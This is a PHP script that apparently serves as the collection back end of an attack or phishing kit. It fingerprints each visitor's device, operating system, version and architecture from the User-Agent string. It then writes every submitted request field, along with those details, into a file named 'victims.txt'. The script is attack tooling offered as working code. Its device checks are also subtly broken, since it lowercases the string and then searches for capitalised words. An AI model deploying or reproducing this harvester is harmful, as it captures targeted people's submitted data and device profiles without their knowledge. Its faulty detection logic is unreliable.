<?php

if(isset($_REQUEST))
    {
        $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $isMob = is_numeric(strpos(strtolower($user_agent), "Mobile")); 
    $isTab = is_numeric(strpos(strtolower($user_agent), "Tablet")); 
    $isAndroid = is_numeric(strpos(strtolower($user_agent), "Android"));
    $isSamsung = is_numeric(strpos(strtolower($user_agent), "SM-"));
    $isSamsung1 = is_numeric(strpos(strtolower($user_agent), "SAMSUNG"));
    $isBlackberry = is_numeric(strpos(strtolower($user_agent), "Blackberry"));
    $isIPhone = is_numeric(strpos(strtolower($user_agent), "iPhone")); 
    $isIPad = is_numeric(strpos(strtolower($user_agent), "iPad")); 
    // $isIOS = $isIPhone || $isIPad; 
 
if ($isAndroid){
    $device="Andriod"; 
}else if($isBlackberry){ 
    $device="BlackBerry";
}else if($isIPhone){ 
    $device="Iphone";
}else if($isIPad){ 
    $device="Ipad";
}else if($isSamsung || $isSamsung1){ 
    $device="Samsung_Galaxy";
}else if($isMob){
    if($isTab){ 
        $device="Tablet";
    }else{ 
        $device="Mobile";
    }
}else{ 
    $device="Computer";
} 

        if ( (!isset($_REQUEST["deviceVersion"])) && (!isset($_REQUEST["architecture"])) ){
            echo "<script>alert('device version & architect are empty');</script>";
            function getVersion() {
                global $user_agent;
                $os_version  = "Unidentified";// ; Win64; x64
                $array     = array(
                                    '/windows nt 10/i'      => '10',
                                    '/windows nt 6.3/i'     => '8.1',
                                    '/windows nt 6.2/i'     => '8',
                                    '/windows nt 6.1/i'     => '7',
                                    '/windows nt 6.0/i'     => 'Vista',
                                    '/windows nt 5.2/i'     => '2003/XP_x64',
                                    '/windows nt 5.1/i'     => 'XP',
                                    '/windows xp/i'         => 'XP',
                                    '/windows nt 5.0/i'     => '2000',
                                    '/windows me/i'         => 'ME',
                                    '/win98/i'              => '98',
                                    '/win95/i'              => '95',
                                    '/win16/i'              => '3.11',
                                    '/macintosh|mac os x/i' =>  'X',
                                    '/mac_powerpc/i'        =>  '9',
                                    '/android 10/i'         =>  '10',
                                    '/android 11/i'         =>  '11',
                                    '/android 12/i'         =>  '12',
                                    '/android 13/i'         =>  '13',
                                    '/android 14/i'         =>  '14',
                                    '/android 15/i'         =>  '15',
                                    '/android 7.0/i'        =>  '7.0',
                                    '/android 6.0.1/i'      =>  '6.0.1'
                              );
                foreach ($array as $regex => $value){
                  if (preg_match($regex, $user_agent)){
                    $os_version = $value;
                  }
                }
                return $os_version;
            }

            function getArch() {
                global $user_agent;
                $os_arch = "Unidentified";
                $array     = array(
                                    '/Win86|x86/i'       =>  'x86',
                                    '/Win64|x64/i'       =>  'x64',
                                    '/Win32|x32/i'       =>  'x32',
                                    '/x86_64/i'          =>  'amd64' // also called x64 or amd64 (a 64-bit architect)
                              );
                
                foreach ($array as $regex => $value){
                  if (preg_match($regex, $user_agent)){
                    $os_arch = $value;
                  }
                }
                return $os_arch;
            }

            $DVersion=getVersion();
            $arch=getArch();
        } else {
            echo "<script>alert('device version & architect are not empty');</script>";

        }
 
function getOS() {
    global $user_agent;
    $os_platform  = "Unknown_OS";
    $os_array     = array(
                        '/ipod|iphone|ipad/i'       =>  'IOS',
                        '/linux/i'                  =>  'Linux',
                        '/mac/i'                    =>  'Mac_OS',
                        '/webos/i'                  =>  'Mobile',
                        '/ubuntu/i'                 =>  'Ubuntu',
                        '/win/i'                    =>  'Windows'
                        // '/linux; andriod/i'      =>  'Android OS (based Linux)',
                  );
    
    foreach ($os_array as $regex => $value){
      if (preg_match($regex, $user_agent)){
        $os_platform = $value;
      }
    }
    return $os_platform;
}
    $os=getOS();


 
    $wfile=fopen("./victims.txt","w");

    foreach($_REQUEST as $var => $val) {
        fwrite($wfile, $var);fwrite($wfile, "=");
        fwrite($wfile, $val);fwrite($wfile, "\r\n");
    }
    fwrite($wfile, "OS");fwrite($wfile, "=");
    fwrite($wfile, $os);fwrite($wfile, "\r\n");
    fwrite($wfile, "devices");fwrite($wfile, "=");
    fwrite($wfile, $device);fwrite($wfile, "\r\n");
    if ( (!isset($_REQUEST["deviceVersion"])) && (!isset($_REQUEST["architecture"])) ){
        fwrite($wfile, "deviceVersion");fwrite($wfile, "=");
        fwrite($wfile, $DVersion);fwrite($wfile, "\r\n");
        fwrite($wfile, "architecture");fwrite($wfile, "=");
        fwrite($wfile, $arch);fwrite($wfile, "\r\n");
    }
    fwrite($wfile, "\r\n");fclose($wfile);
}

?>
